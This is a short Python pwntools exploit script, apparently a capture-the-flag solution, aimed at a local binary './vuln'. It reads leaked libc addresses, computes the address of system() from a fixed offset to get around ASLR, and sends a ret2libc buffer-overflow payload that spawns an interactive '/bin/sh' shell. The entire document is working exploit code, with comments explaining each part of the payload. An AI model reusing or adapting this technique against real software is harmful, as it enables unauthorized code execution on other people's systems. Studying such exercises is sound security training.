from pwn import *

bufsize = 148


#get the addresses of sys and puts from gdb
#print &puts and print &system
offset = 0xf75db940 - 0xf7600140
print(offset) #the offset is constant even if the addresses are randomized with ASLR


s = process('./vuln')
_ = s.recvline()
_ = s.recvline()
puts = s.recvline().split()[1]
flush = s.recvline().split()[1]
read = s.recvline().split()[1]
write = s.recvline().split()[1]
shell = s.recvline().split()[1]

system = int(puts,16) + offset
system_addr = p32(system)
print(system_addr)
print(puts,flush,read,write,shell)
payload = 'A'* (148 + 12) + system_addr + 'A'*4 + p32(int(shell,16)) #fakes a call to system(/bin/sh)
#148 to fill the buffer, 12 to wipe out some useless stuff, the return address which in this case is system , 4 to wipe out some more useless stuff, and finally the parameter to the sys call we want to fake


s.sendlineafter('string:',payload)

s.interactive() #shell shell baby